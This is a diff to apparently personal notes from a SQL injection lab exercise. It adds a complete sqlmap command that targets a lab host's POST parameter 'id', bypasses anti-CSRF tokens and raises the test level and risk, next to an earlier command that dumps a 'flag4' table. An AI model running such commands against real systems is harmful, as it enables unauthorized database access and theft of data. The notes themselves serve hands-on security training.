@@ -46,3 +46,13 @@
 > sudo sqlmap 'http://<target>:<port>/case4.php' --compressed -X POST \
 -H 'Content-Type: application/json' \ --data-raw '{"id":1*}' -D testdb -T flag4 --dump
 - and got a flag ;)
+- sqlmap -u "http://94.237.122.95:33765/case8.php/" \
+  --method=POST \
+  --data="id=1&t0ken=pSaEdJhxnKInXIrNxtunSTfc2JG5BPtRYKrUjxpvA" \
+  -p id \
+  --csrf-token="t0ken" \
+  --csrf-url="http://94.237.122.95:33765/case8.php/" \
+  --batch \
+  --level=2 \
+  --risk=2
+- Detection and exploit SQLi vulnerability in POST parameter id, while taking care of the anti-CSRF protection command
